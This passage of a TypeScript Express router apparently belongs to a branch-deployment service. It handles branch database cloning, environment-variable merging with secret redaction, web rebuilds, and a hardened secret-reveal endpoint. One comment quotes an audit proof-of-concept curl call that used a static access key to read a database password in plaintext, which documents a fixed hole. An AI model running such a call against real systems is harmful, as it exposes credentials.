    const runtime = resourceRuntimeKey(resource.runtime);
    if (!['mysql', 'postgres', 'mongodb'].includes(runtime)) {
      res.status(400).json({ error: `${resource.runtime} 暂不支持连接变量注入` });
      return;
    }
    const rawInfra = resource.raw as InfraService;
    const connection = getExistingResourceConnectionEnv(runtime, rawInfra, branch);
    if (!connection) {
      res.status(409).json({ error: `当前分支没有独立 ${resource.runtime} 凭据；请先创建空库、克隆 main/prod，或重置凭据。` });
      return;
    }
    const bodyIds = Array.isArray(req.body?.targetResourceIds)
      ? req.body.targetResourceIds.map((item: unknown) => String(item || '').trim()).filter(Boolean)
      : [];
    const candidateApps = resources.filter((item) => (
      item.source === 'app'
      && (
        item.dependsOn.includes(rawInfra.id)
        || item.dependsOn.includes(resourceId)
        || item.dependsOn.includes(resource.serviceName)
      )
    ));
    const targetIds = bodyIds.length > 0 ? new Set(bodyIds) : new Set(candidateApps.map((item) => item.id));
    const targetApps = resources.filter((item) => item.source === 'app' && targetIds.has(item.id));
    if (targetApps.length === 0) {
      res.status(409).json({ error: '没有可注入的应用资源；请先在构建配置 dependsOn 中声明数据库依赖，或传入 targetResourceIds。' });
      return;
    }
    const actor = resolveActorFromRequest(req);
    const injectedApps = targetApps.map((app) => {
      const raw = app.raw as ServiceState;
      const override = injectEnvIntoProfileOverride(branch, raw.profileId, connection.injectedEnv);
      return {
        resourceId: app.id,
        profileId: raw.profileId,
        displayName: app.displayName,
        serviceName: app.serviceName,
        overrideEnvKeys: Object.keys(override.env || {}).filter((key) => Object.prototype.hasOwnProperty.call(connection.injectedEnv, key)),
      };
    });
    stateService.appendActivityLog(projectId, {
      type: 'resource-connection-inject',
      branchId: branch.id,
      branchName: branch.branch,
      actor,
      resourceId,
      resourceName: resource.displayName,
      result: 'success',
      note: `${resource.displayName} 连接变量已注入 ${injectedApps.map((item) => item.serviceName).join(', ')}，需要重新部署应用生效`,
    });
    stateService.save();
    res.json({
      branchId: branch.id,
      resourceId,
      injectedEnv: connection.maskedInjectedEnv,
      injectedApps,
      needsRedeploy: true,
    });
  });

  router.get('/branches/:id/resources/:resourceId/clone-tasks', (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }
    const resourceId = decodeResourceId(req.params.resourceId);
    const tasks = stateService
      .listResourceCloneTasks({ projectId, branchId: branch.id, resourceId })
      .slice()
      .reverse();
    res.json({ branchId: branch.id, resourceId, tasks });
  });

  router.post('/branches/:id/resources/:resourceId/clone-tasks', async (req, res) => {
    const branch = stateService.getBranch(req.params.id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${req.params.id}" 不存在` });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) { res.status(m.status).json(m.body); return; }

    const resourceId = decodeResourceId(req.params.resourceId);
    const resources = await getBranchResourceSnapshot(branch);
    const resource = resources.find((item) => item.id === resourceId);
    if (!resource) {
      res.status(404).json({ error: `资源 "${resourceId}" 不存在` });
      return;
    }
    if (resource.source !== 'infra' || resource.kind !== 'database') {
      res.status(400).json({ error: '只有数据库资源支持创建分支数据库/克隆任务' });
      return;
    }
    const mode = typeof req.body?.mode === 'string' ? req.body.mode : 'empty';
    if (!['empty', 'clone-main', 'restore-backup', 'connect-existing'].includes(mode)) {
      res.status(400).json({ error: 'mode 必须是 empty / clone-main / restore-backup / connect-existing' });
      return;
    }
    const cloneAction: ResourcePermissionAction = mode === 'restore-backup'
      ? 'backup-restore'
      : mode === 'connect-existing'
        ? 'database-connect-existing'
        : 'database-clone';
    if (!requireResourcePermission(req, res, cloneAction, branch, resource)) return;
    const runtime = resourceRuntimeKey(resource.runtime);
    const actor = resolveActorFromRequest(req);
    const rawInfra = resource.raw as InfraService;
    const baseDb = runtime === 'mysql' || runtime === 'postgres' || runtime === 'mongodb' || runtime === 'redis'
      ? resourceDatabaseForRuntime(runtime, rawInfra, branch) || 'app'
      : resolvedServiceDbName(rawInfra) || 'app';
    const targetDatabase = String(req.body?.targetDatabase || branchDatabaseName(baseDb, branch))
      .replace(/[^a-zA-Z0-9_]/g, '_')
      .slice(0, 64);
    const strategy = mode === 'connect-existing'
      ? 'external-connection'
      : mode === 'restore-backup'
        ? 'backup-restore'
        : mode === 'clone-main'
          ? (runtime === 'mysql' ? 'mysqldump' : 'background-copy')
          : 'branch-database';
    const task = stateService.addResourceCloneTask({
      projectId,
      branchId: branch.id,
      resourceId,
      runtime,
      mode: mode as 'empty' | 'clone-main' | 'restore-backup' | 'connect-existing',
      strategy,
      status: mode === 'empty' ? 'running' : 'pending',
      progress: mode === 'empty' ? 20 : 5,
      progressMessage: mode === 'empty' ? '正在创建分支独立空库' : '任务已登记，等待后台执行器接管',
      sourceBranchId: typeof req.body?.sourceBranchId === 'string' ? req.body.sourceBranchId : undefined,
      sourceResourceId: typeof req.body?.sourceResourceId === 'string' ? req.body.sourceResourceId : resourceId,
      targetDatabase,
      backupId: typeof req.body?.backupId === 'string' ? req.body.backupId : undefined,
      externalConnectionName: typeof req.body?.externalConnectionName === 'string' ? req.body.externalConnectionName : undefined,
      actor,
      log: `[${new Date().toISOString()}] ${actor} created ${mode} task for ${resource.displayName}`,
    });

    let resultTask = task;
    try {
      if (mode === 'empty') {
        let branchDb: MysqlConnectionEnvResult | MysqlBranchDatabaseResult;
        if (runtime === 'mysql') {
          if (rawInfra.status !== 'running') {
            throw new Error(`MySQL 服务当前未运行（status=${rawInfra.status}）`);
          }
          branchDb = await createMysqlBranchDatabase(rawInfra, branch, targetDatabase);
        } else if (runtime === 'postgres') {
          branchDb = await createPostgresBranchDatabase(rawInfra, branch, targetDatabase);
        } else if (runtime === 'mongodb') {
          branchDb = await createMongoBranchDatabase(rawInfra, branch, targetDatabase);
        } else {
          throw new Error(`${resource.runtime} 暂不支持创建分支独立数据库`);
        }
        injectBranchEnv(branch, branchDb.injectedEnv);
        resultTask = stateService.updateResourceCloneTask(task.id, {
          status: 'completed',
          progress: 100,
          progressMessage: `分支独立 ${resource.runtime} 空库已创建，连接变量已注入分支 scope`,
          startedAt: task.createdAt,
          finishedAt: new Date().toISOString(),
          injectedEnv: branchDb.maskedInjectedEnv,
          log: `${task.log || ''}\n[${new Date().toISOString()}] created ${runtime} database ${targetDatabase} and branch user ${branchDb.branchUser || '(none)'}`,
        });
      } else if (mode === 'clone-main' && runtime === 'mysql') {
        const sourceDatabase = String(req.body?.sourceDatabase || baseDb)
          .replace(/[^a-zA-Z0-9_]/g, '_')
          .slice(0, 64);
        resultTask = stateService.updateResourceCloneTask(task.id, {
          status: 'running',
          progress: 5,
          progressMessage: `后台克隆任务已启动：${sourceDatabase} -> ${targetDatabase}`,
          startedAt: new Date().toISOString(),
        });
        stateService.appendActivityLog(projectId, {
          type: 'resource-db-clone',
          branchId: branch.id,
          branchName: branch.branch,
          actor,
          resourceId,
          resourceName: resource.displayName,
          result: 'pending',
          note: `${resource.displayName} clone-main 后台任务已启动：${sourceDatabase} -> ${targetDatabase}`,
        });
        stateService.save();
        void runMysqlCloneMainTask({
          taskId: task.id,
          projectId,
          branch,
          resourceId,
          resourceName: resource.displayName,
          actor,
          service: rawInfra,
          sourceDatabase,
          targetDatabase,
        });
        res.status(202).json({ task: resultTask });
        return;
      } else if (mode === 'clone-main' && (runtime === 'postgres' || runtime === 'mongodb')) {
        const sourceDatabase = String(req.body?.sourceDatabase || baseDb)
          .replace(/[^a-zA-Z0-9_]/g, '_')
          .slice(0, 64);
        resultTask = stateService.updateResourceCloneTask(task.id, {
          status: 'running',
          progress: 15,
          progressMessage: `正在复制 ${sourceDatabase} -> ${targetDatabase}`,
          startedAt: new Date().toISOString(),
          log: `${task.log || ''}\n[${new Date().toISOString()}] started ${runtime} clone from ${sourceDatabase} to ${targetDatabase}`,
        });
        const cloned = runtime === 'postgres'
          ? await clonePostgresMainIntoBranchDatabase({ service: rawInfra, branch, sourceDatabase, targetDatabase })
          : await cloneMongoMainIntoBranchDatabase({ service: rawInfra, branch, sourceDatabase, targetDatabase });
        injectBranchEnv(branch, cloned.injectedEnv);
        resultTask = stateService.updateResourceCloneTask(task.id, {
          status: 'completed',
          progress: 100,
          progressMessage: `${resource.runtime} 克隆完成，连接变量已注入分支 scope`,
          finishedAt: new Date().toISOString(),
          injectedEnv: cloned.maskedInjectedEnv,
          log: `${task.log || ''}\n[${new Date().toISOString()}] completed ${runtime} clone into ${targetDatabase}`,
        });
      } else if (mode === 'clone-main') {
        throw new Error(`${resource.runtime} 暂不支持从 main/prod 克隆`);
      } else if (mode === 'restore-backup') {
        const backupName = String(req.body?.backupName || req.body?.backupId || '').trim();
        if (!backupName) {
          throw new Error('从备份创建新数据库需要 backupName');
        }
        if (!['mysql', 'postgres', 'mongodb'].includes(runtime)) {
          throw new Error(`${resource.runtime} 暂不支持从备份创建独立新库`);
        }
        const restored = await restoreResourceBackupIntoBranchDatabase({
          runtime: runtime as ResourceDatabaseRuntime,
          service: rawInfra,
          branch,
          backupName,
          targetDatabase,
          sourceDatabase: String(req.body?.sourceDatabase || baseDb).replace(/[^a-zA-Z0-9_]/g, '_').slice(0, 64),
        });
        injectBranchEnv(branch, restored.injectedEnv);
        resultTask = stateService.updateResourceCloneTask(task.id, {
          status: 'completed',
          progress: 100,
          progressMessage: `已从备份 ${restored.backup} 创建独立数据库 ${targetDatabase}`,
          startedAt: task.createdAt,
          finishedAt: new Date().toISOString(),
          backupId: restored.backup,
          injectedEnv: restored.maskedInjectedEnv,
          log: `${task.log || ''}\n[${new Date().toISOString()}] restored backup ${restored.backup} into ${targetDatabase}`,
        });
      } else if (mode === 'connect-existing') {
        const connectionString = String(req.body?.connectionString || '').trim();
        if (!connectionString) {
          throw new Error('连接已有数据库需要 connectionString');
        }
        if (!/^[a-z][a-z0-9+.-]*:\/\//i.test(connectionString)) {
          throw new Error('connectionString 必须是合法连接 URL');
        }
        const injectedEnv = externalConnectionEnv(runtime, connectionString);
        injectBranchEnv(branch, injectedEnv);
        const maskedConnectionString = maskConnectionString(connectionString);
        resultTask = stateService.updateResourceCloneTask(task.id, {
          status: 'completed',
          progress: 100,
          progressMessage: `已连接已有数据库：${req.body?.externalConnectionName || resource.displayName}`,
          startedAt: task.createdAt,
          finishedAt: new Date().toISOString(),
          externalConnectionName: typeof req.body?.externalConnectionName === 'string' ? req.body.externalConnectionName : resource.displayName,
          injectedEnv: Object.fromEntries(Object.keys(injectedEnv).map((key) => [key, maskedConnectionString])),
          log: `${task.log || ''}\n[${new Date().toISOString()}] connected existing database ${maskedConnectionString}`,
        });
      }
      stateService.appendActivityLog(projectId, {
        type: 'resource-db-clone',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName: resource.displayName,
        result: resultTask.status === 'completed' ? 'success' : 'pending',
        note: `${resource.displayName} ${mode} 任务：${resultTask.progressMessage || resultTask.status}`,
      });
      stateService.save();
      res.status(201).json({ task: resultTask });
    } catch (err) {
      resultTask = stateService.updateResourceCloneTask(task.id, {
        status: 'failed',
        progress: 100,
        errorMessage: (err as Error).message,
        progressMessage: '任务失败',
        finishedAt: new Date().toISOString(),
        log: `${task.log || ''}\n[${new Date().toISOString()}] failed: ${(err as Error).message}`,
      });
      stateService.appendActivityLog(projectId, {
        type: 'resource-db-clone',
        branchId: branch.id,
        branchName: branch.branch,
        actor,
        resourceId,
        resourceName: resource.displayName,
        result: 'failed',
        note: `${resource.displayName} ${mode} 任务失败：${(err as Error).message}`,
      });
      stateService.save();
      res.status(500).json({ error: (err as Error).message, task: resultTask });
    }
  });

  // GET /api/branches/:id/effective-env — 该分支在 deploy 时真正生效的环境变量(Phase A)
  //
  // 用户反馈(2026-05-04):「分支详情抽屉里的『变量』tab 还没做」。这个端点把
  // getMergedEnv() 的结果按来源分类返回,前端可以按「来源 chip」过滤:
  //   - cds-builtin: CDS_HOST / CDS_PROJECT_SLUG 等系统注入,只读不可改
  //   - mirror:      镜像加速变量(NPM_REGISTRY 等),开关在 CDS 系统设置
  //   - global:      _global scope customEnv,所有项目共享
  //   - project:     当前项目的 customEnv,只影响这个项目
  //
  // **敏感值默认 redact**(显示 `••••<最后4位>`),前端单条「显示值」按钮按需
  // 解锁(同 Vercel/Railway 行为)。判定走 env-classifier 的 SECRET_KEY_PATTERNS。
  //
  // 分支级覆盖写在 customEnv[branch.id]。合并优先级:
  // branch > project > global > mirror/CDS builtin。
  // EnvEntry / merge 逻辑 — list 端点和 reveal 端点共享,Bugbot PR #524 第四轮
  // 反馈:两个端点合并优先级各写一份容易漂移(实际审下来是一致的,但 future-
  // proof 的做法是抽到一处)。
  type _EnvEntry = {
    key: string;
    value: string;
    source: 'cds-builtin' | 'cds-derived' | 'mirror' | 'global' | 'project' | 'branch';
    isSecret: boolean;
  };
  const _SECRET_PATTERNS = [
    'PASSWORD', 'SECRET', 'TOKEN', 'API_KEY', 'APIKEY', 'ACCESS_KEY',
    'PRIVATE_KEY', 'OAUTH', 'STRIPE', 'TWILIO', 'SENDGRID', 'MAILGUN',
    'AWS_ACCESS', 'AWS_SECRET', 'CREDENTIAL',
  ];
  // CDS 系统派生的项目身份 key — 不允许被 global/project customEnv 覆盖。
  // 即使用户在 _global 写了同名 key,生效的也是 builtinDerived 真值。
  const RESERVED_CDS_KEYS = ['CDS_PROJECT_ID', 'CDS_PROJECT_SLUG'];
  const _isSecretKey = (key: string): boolean => {
    const u = key.toUpperCase();
    return _SECRET_PATTERNS.some((p) => u.includes(p));
  };
  // 合并优先级和 deploy 路径完全一致(getMergedEnv):
  // builtin < mirror < cds-derived < global < project < branch
  const buildBranchEnvMap = (projectId: string, branchId: string): Map<string, _EnvEntry> => {
    const cdsEnv = stateService.getCdsEnvVars(projectId);
    const mirrorEnv = stateService.getMirrorEnvVars();
    const project = stateService.getProject(projectId);
    const builtinDerived: Record<string, string> = {};
    if (project) {
      builtinDerived.CDS_PROJECT_ID = project.id;
      builtinDerived.CDS_PROJECT_SLUG = project.slug;
    }
    const rawGlobal = stateService.getCustomEnvScope('_global');
    const rawProjectScoped = projectId === '_global'
      ? {}
      : stateService.getCustomEnvScope(projectId);
    const rawBranchScoped = branchId ? stateService.getCustomEnvScope(branchId) : {};
    const branchOnlyKeys = new Set(Object.keys(rawBranchScoped));
    const projectOnlyKeys = new Set(Object.keys(rawProjectScoped).filter((k) => !branchOnlyKeys.has(k)));
    const globalOnlyKeys = new Set(Object.keys(rawGlobal).filter((k) => !projectOnlyKeys.has(k) && !branchOnlyKeys.has(k)));

    const merged = new Map<string, _EnvEntry>();
    for (const [k, v] of Object.entries(cdsEnv)) {
      merged.set(k, { key: k, value: v, source: 'cds-builtin', isSecret: _isSecretKey(k) });
    }
    for (const [k, v] of Object.entries(mirrorEnv)) {
      merged.set(k, { key: k, value: v, source: 'mirror', isSecret: _isSecretKey(k) });
    }
    for (const [k, v] of Object.entries(builtinDerived)) {
      merged.set(k, { key: k, value: v, source: 'cds-derived', isSecret: false });
    }
    for (const k of globalOnlyKeys) {
      merged.set(k, { key: k, value: rawGlobal[k], source: 'global', isSecret: _isSecretKey(k) });
    }
    for (const [k, v] of Object.entries(rawProjectScoped)) {
      merged.set(k, { key: k, value: v, source: 'project', isSecret: _isSecretKey(k) });
    }
    for (const [k, v] of Object.entries(rawBranchScoped)) {
      merged.set(k, { key: k, value: v, source: 'branch', isSecret: _isSecretKey(k) });
    }
    // RESERVED CDS keys 必须保留 cds-derived 真值,杜绝 global/project 改写
    // 系统派生的项目身份(Bugbot PR #524 第九轮 Medium):用户在 _global
    // 写一个 CDS_PROJECT_ID=evil 就会让所有分支显示 + deploy 时拿到错的项目 id。
    // 这里强制把这两个 key 还原成 builtinDerived 的值,view 与 deploy 同时正确。
    // 注:此处仅修 view 路径(buildBranchEnvMap),deploy 路径 getMergedEnv 仍
    // 沿用旧顺序——后者非本 PR scope 但同样需要 reserved key 保护,跟进 PR 处理。
    for (const k of RESERVED_CDS_KEYS) {
      if (k in builtinDerived) {
        merged.set(k, { key: k, value: builtinDerived[k], source: 'cds-derived', isSecret: false });
      }
    }
    return merged;
  };
  const _maskSecret = (v: string): string => {
    if (v.length > 4) return '••••' + v.slice(-4);
    return '••••';
  };

  /**
   * In-process 重建 cds/web/dist —— self-update 与 self-force-sync 共用。
   *
   * 历史(2026-05-04):daemon 启动时 cds_start_background 调 build_web,但实测
   * production 上 build_web 没产出新 dist(可能 cds_is_running 短路 / sub-shell
   * exit code 丢失 / 其他难诊断的环境差异 — 反正不可靠)。直接在当前进程
   * await pnpm 命令,exit code 看得见,失败有日志。
   *
   * Bugbot PR #524 第九轮 Medium 反馈:之前只有 self-update 跑这个 in-process
   * web build,self-force-sync 同样切代码同样重启同样依赖 web/dist,但跳过
   * 了这步,会复现"已更新但 UI 没变"。抽成 helper 让两端口共用。
   *
   * 行为:
   *   - .build-sha 已匹配 newHead → 跳过(no-op,~ms)
   *   - 否则:删 .build-sha → pnpm install → pnpm build(每 15s 心跳防 cloudflare
   *     100s 切流)→ 写新 .build-sha(full SHA)
   *   - 失败:writeFileSync .build-error + .cds/web-build.log,并抛错中止 self-update
   *     成功态。否则后端 HEAD 已更新而 web/dist 仍是旧包,会造成"看似更新成功,
   *     前端实际没变"。
   */
  const runInProcessWebBuild = async (
    newHead: string,
    send: (step: string, status: string, title: string) => void,
    res: import('express').Response,
  ): Promise<Partial<SelfUpdateTimingBreakdown>> => {
    const webBuildOverallStartedAt = Date.now();
    const finishWebBuildTiming = (
      webBuildSkipped: boolean,
      webBuildReason: string,
    ): Partial<SelfUpdateTimingBreakdown> => ({
      webBuildMs: Date.now() - webBuildOverallStartedAt,
      webBuildSkipped,
      webBuildReason,
    });
    const repoRoot = config.repoRoot;
    const webDir = path.join(repoRoot, 'cds', 'web');
    const webDist = path.join(webDir, 'dist');
    const webShaFile = path.join(webDist, '.build-sha');
    // .web-input-sha 是 cds/web 子树的"上次构建快照锚点":存的是
    // `git log -1 --format=%H HEAD -- cds/web` 的输出(最近一次触动 cds/web
    // 的 commit)。下次自更新时如果这个值没变,说明 cds/web 自上次成功
    // 构建以来内容上完全一致 —— 即便 HEAD 已经动到别的 commit,bundle 仍是
    // 二进制等价的,可以直接复用。这条 fast-path 覆盖了"纯后端 .ts 改动"
    // 的常见自更新,把 web build 那 30-90s 直接砍掉。详见 perf 提交说明。
    const webInputShaFile = path.join(webDist, '.web-input-sha');
    const webBuildLogPath = path.join(repoRoot, 'cds', '.cds', 'web-build.log');
    const abortWebBuild = (message: string): never => {
      sendSSE(res, 'error', {
        message,
        stage: 'web-build',
        hint: 'web/dist 未更新,CDS 继续使用旧前端包。请先修复前端构建错误后重新触发 self-update。',
      });
      res.end();
      throw new Error(message);
    };
    if (!fs.existsSync(path.join(webDir, 'package.json'))) {
      return finishWebBuildTiming(true, 'no-package');
    }
    let existingWebSha = '';
    try {
      if (fs.existsSync(webShaFile)) existingWebSha = fs.readFileSync(webShaFile, 'utf8').trim();
    } catch { /* ignore */ }
    // fast-path 命中 = 我们断言"当前 dist 等价于上次成功构建"。
    // 顺手清掉残留的 .build-error,否则 /api/self-status 仍报旧 build 错误,
    // 即便我们这次"跳过"也是一次成功的"复用"。Codex Review d5ad90f P2 报告
    // 的边角:transient vite/pnpm 失败留下 .build-error,fast-path 命中后
    // 没人清,operator 永远看到陈旧错误。
    const clearStaleBuildError = (): void => {
      try {
        const errFile = path.join(webDist, '.build-error');
        if (fs.existsSync(errFile)) fs.unlinkSync(errFile);
      } catch { /* ignore */ }
    };
    // ① 最廉价的 fast-path:HEAD 与上次构建一致(没出过新 commit)
    if (existingWebSha && existingWebSha.startsWith(newHead) && fs.existsSync(path.join(webDist, 'index.html'))) {
      clearStaleBuildError();
      send('web-build', 'done', `web/dist 已是最新 (${newHead}) — 跳过重建`);
      return finishWebBuildTiming(true, 'head-match');
    }
    // ② cds/web 子树 fast-path:HEAD 变了,但 cds/web 子树自上次成功构建
    // 以来没变过(纯后端改动)。bundle 内容必然等价,复用即可,顺手把
    // .build-sha 滚到当前 HEAD 让 server.ts 的 bundleStale 判定满足。
    let lastWebChange = '';
    try {
      lastWebChange = (await shell.exec('git log -1 --format=%H HEAD -- cds/web', { cwd: repoRoot })).stdout.trim();
    } catch { /* git 失败就走正式构建 */ }
    let existingWebInput = '';
    try {
      if (fs.existsSync(webInputShaFile)) existingWebInput = fs.readFileSync(webInputShaFile, 'utf8').trim();
    } catch { /* ignore */ }
    if (
      lastWebChange &&
      existingWebInput === lastWebChange &&
      fs.existsSync(path.join(webDist, 'index.html'))
    ) {
      try { fs.writeFileSync(webShaFile, newHead + '\n'); } catch { /* 写不上不致命 */ }
      clearStaleBuildError();
      send(
        'web-build',
        'done',
        `cds/web 自 ${lastWebChange.slice(0, 7)} 起未变 — 跳过 web 构建,复用现有 bundle`,
      );
      return finishWebBuildTiming(true, 'web-input-match');
    }
    send('web-build', 'running', `正在 in-process 重建 web/dist (日志: cds/.cds/web-build.log)`);
    try {
      try { fs.unlinkSync(webShaFile); } catch { /* ignore */ }
      const buildStartedAt = Date.now();
      // 用户反馈 2026-05-06:"network error 用时 2m12s" — 中间层(浏览器/nginx)
      // 切了 SSE 长连接。15s 一次的 tick 在 vite 子进程长时间无 stdout 时仍可能
      // 触发某些代理的 idle 超时。改 5s 一次,密度高 5 倍,代理几乎不会判 idle。
      const heartbeat = setInterval(() => {
        const elapsed = Math.floor((Date.now() - buildStartedAt) / 1000);
        sendSSE(res, 'web-build-tick', { elapsed, message: `web build 进行中 ${elapsed}s` });
        // 2026-05-07 心跳同步刷新 active-update.json 的 lastTickAt + 写一行
        // logTail。前端面板不再看到"卡 web-build 2 分钟空白"——能看到滚动的
        // "web build 进行中 5s / 10s / 15s ..." 字样,知道后端真在跑。
        stateService.tickSelfUpdate();
        if (elapsed % 15 === 0) {
          stateService.appendSelfUpdateLog('info', `web build 进行中 ${elapsed}s`);
        }
      }, 5_000);
      try {
        // lockfile-hash fast-path:web/pnpm-lock.yaml + web/package.json 没动
        // 时直接 skip,把"web build"耗时压成只剩 vite build 那段。
        const wInstall = await runPnpmInstallWithCache(shell, webDir);
        if (wInstall.exitCode !== 0) {
          clearInterval(heartbeat);
          const message = `web pnpm install 失败 (exit=${wInstall.exitCode}, 详细日志见 cds/.cds/web-build.log) — 已中止 self-update`;
          send('web-build', 'error', message);
          // Bugbot PR #524 第十一轮:install 失败时也要写 .build-error,与
          // build 失败路径一致,这样 /api/self-status 能通过 webBuildError 识别;
          // 否则 .build-sha 已被前面 unlinkSync 删掉,但 webBuildError=''
          // bundleStale 仅靠 SHA 不一致间接触发 — 失败原因看不到。
          try {
            fs.mkdirSync(path.dirname(webBuildLogPath), { recursive: true });
            fs.writeFileSync(webBuildLogPath,
              `=== ${new Date().toISOString()} in-process pnpm install to ${newHead} ===\n` +
              `EXIT: ${wInstall.exitCode}\nSTDOUT:\n${wInstall.stdout || ''}\nSTDERR:\n${wInstall.stderr || ''}\n`,
            );
            fs.writeFileSync(
              path.join(webDist, '.build-error'),
              `ts=${new Date().toISOString()}\nhead=${newHead}\nstage=install\nexit=${wInstall.exitCode}\nlog=${webBuildLogPath}\n`,
            );
          } catch { /* ignore */ }
          abortWebBuild(message);
        } else {
          const wBuild = await shell.exec(
            'pnpm build',
            { cwd: webDir, timeout: 300_000 },
          );
          clearInterval(heartbeat);
          if (wBuild.exitCode === 0) {
            // 写 FULL sha(40字符)与 'git rev-parse HEAD' 输出一致(no-op 检测要求)
            let fullHeadForSha = '';
            try {
              fullHeadForSha = (await shell.exec('git rev-parse HEAD', { cwd: repoRoot })).stdout.trim();
            } catch { /* fallback 用 short */ }
            try { fs.writeFileSync(webShaFile, (fullHeadForSha || newHead) + '\n'); } catch { /* 写不上不致命 */ }
            // 同步写 .web-input-sha:下次自更新若 cds/web 子树没动,fast-path 命中。
            try {
              if (lastWebChange) fs.writeFileSync(webInputShaFile, lastWebChange + '\n');
            } catch { /* 写不上不致命,下次走 ① 路径或正式构建 */ }
            const elapsed = Math.floor((Date.now() - buildStartedAt) / 1000);
            send('web-build', 'done', `web/dist 已重建到 ${newHead} (${elapsed}s)`);
            return finishWebBuildTiming(false, 'rebuilt');
          } else {
            const tail = ((wBuild.stderr || wBuild.stdout || '')).slice(-400);
            const message = `web build 失败 (exit=${wBuild.exitCode}, 详细日志: cds/.cds/web-build.log): ${tail}`;
            send('web-build', 'error', message);
            try {
              fs.mkdirSync(path.dirname(webBuildLogPath), { recursive: true });
              fs.writeFileSync(webBuildLogPath,
                `=== ${new Date().toISOString()} in-process web build to ${newHead} ===\n` +
                `EXIT: ${wBuild.exitCode}\nSTDOUT:\n${wBuild.stdout || ''}\nSTDERR:\n${wBuild.stderr || ''}\n`,
              );
              fs.writeFileSync(
                path.join(webDist, '.build-error'),
                `ts=${new Date().toISOString()}\nhead=${newHead}\nexit=${wBuild.exitCode}\nlog=${webBuildLogPath}\n`,
              );
            } catch { /* ignore */ }
            abortWebBuild(message);
          }
        }
      } finally {
        clearInterval(heartbeat);
      }
    } catch (err) {
      if (!res.writableEnded) {
        const message = `web build 异常: ${(err as Error).message}`;
        send('web-build', 'error', message);
        abortWebBuild(message);
      }
      throw err;
    }
    return finishWebBuildTiming(false, 'rebuilt');
  };

  router.get('/branches/:id/effective-env', (req, res) => {
    const { id } = req.params;
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const m = assertProjectAccess(req as any, branch.projectId || 'default');
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }

    const projectId = branch.projectId || 'default';
    const project = stateService.getProject(projectId);
    const merged = buildBranchEnvMap(projectId, branch.id);

    // 排序与覆盖优先级一致(Bugbot PR #524 第八轮反馈):
    // 覆盖优先级 builtin < mirror < cds-derived < global < project < branch,
    // 显示顺序应该是同向的"最高优先级在最前"——branch > project > global >
    // cds-derived > mirror > cds-builtin。之前 mirror=2 排在 cds-derived=3 前面
    // 与覆盖语义反向,debugging 时容易误判"哪个值最终生效"。
    const sourceOrder: Record<_EnvEntry['source'], number> = {
      branch: 0, project: 1, global: 2, 'cds-derived': 3, mirror: 4, 'cds-builtin': 5,
    };
    const variables = Array.from(merged.values()).sort((a, b) => {
      const so = sourceOrder[a.source] - sourceOrder[b.source];
      if (so !== 0) return so;
      return a.key.localeCompare(b.key);
    });

    // 服务端 redact secret 值(Bugbot PR #524 反馈):之前 isSecret=true 的
    // 变量也以 plaintext 在 JSON 里返回,前端只是 display 时遮挡 → 浏览器
    // network tab / 截图 / 屏幕分享/ Activity Monitor 日志都能直接看见明文。
    // 改为:secret 变量 value 字段返回 '••••' + 末 4 位(短于 4 位则全 ••••),
    // 同时返 valueLength 让 UI 显示长度。真值通过单独的 reveal 端点按 key 取。
    const safeVariables = variables.map((v) => v.isSecret
      ? { ...v, value: _maskSecret(v.value), valueLength: v.value.length }
      : { ...v, valueLength: v.value.length });

    res.json({
      branchId: branch.id,
      projectId,
      projectSlug: project?.slug || projectId,
      total: safeVariables.length,
      bySource: {
        branch: safeVariables.filter((v) => v.source === 'branch').length,
        project: safeVariables.filter((v) => v.source === 'project').length,
        global: safeVariables.filter((v) => v.source === 'global').length,
        mirror: safeVariables.filter((v) => v.source === 'mirror').length,
        'cds-derived': safeVariables.filter((v) => v.source === 'cds-derived').length,
        'cds-builtin': safeVariables.filter((v) => v.source === 'cds-builtin').length,
      },
      variables: safeVariables,
    });
  });

  // GET /api/branches/:id/effective-env/reveal?key=<KEY>
  //
  // 单条 secret 取明文,与 /effective-env 的 redact 模式配套。前端 Reveal 眼睛
  // 按钮 / Copy 按钮用到原值时才 hit 这个端点。这样:
  //   1. 默认响应里没有明文 → 截图 / network tab 不再泄露
  //   2. 真正想看明文要单独触发,日志面板能更清晰记录"用户在 X 时间查看了 Y 变量"
  // 鉴权:GitHub/cookie auth + project-scoped agent key 隔离(assertProjectAccess)。
  // Bugbot PR #524 第四轮 High security:之前漏了 assertProjectAccess,
  // 项目 A 的 cdsp_xxx key 能 reveal 项目 B 的 secret 明文,绕过 redact 设计。
  router.get('/branches/:id/effective-env/reveal', (req, res) => {
    const { id } = req.params;
    const key = (req.query.key as string | undefined) || '';
    if (!key) {
      res.status(400).json({ error: 'missing query parameter "key"' });
      return;
    }
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: '分支不存在' });
      return;
    }
    const projectId = branch.projectId || 'default';
    const m = assertProjectAccess(req as any, projectId);
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }
    // SECURITY P1 (2026-05-09): plaintext secret reveal now requires
    // project-scoped credentials. Static AI_ACCESS_KEY (req.aiSession scope
    // '_global'), cdsg_ global agent keys, and cluster bootstrap tokens
    // historically returned 200 because assertProjectAccess only checks
    // when req.cdsProjectKey is set. The audit P1 PoC showed `curl -H
    // "X-AI-Access-Key: $static" .../reveal?key=CDS_MYSQL_PASSWORD` → 200
    // + plaintext. Lock it down: only cdsp_ project key matching this
    // project, or human cookie auth, may reveal.
    const projKey = (req as any).cdsProjectKey as { projectId: string } | undefined;
    const cookieAuth = (req as any)._cdsCookieAuth === true;
    const ownerOk = (projKey && projKey.projectId === projectId) || cookieAuth;
    if (!ownerOk) {
      res.status(403).json({
        error: 'forbidden_secret_reveal',
        reason: 'reveal requires project-scoped key (cdsp_) or human cookie session',
        projectId,
        hint: '请在该项目下「授权 Agent」生成 cdsp_ 项目级 key 后再调用 reveal。静态 AI_ACCESS_KEY 与 cdsg_ 全局 key 不再允许读取明文 secret。',
      });
      return;
    }
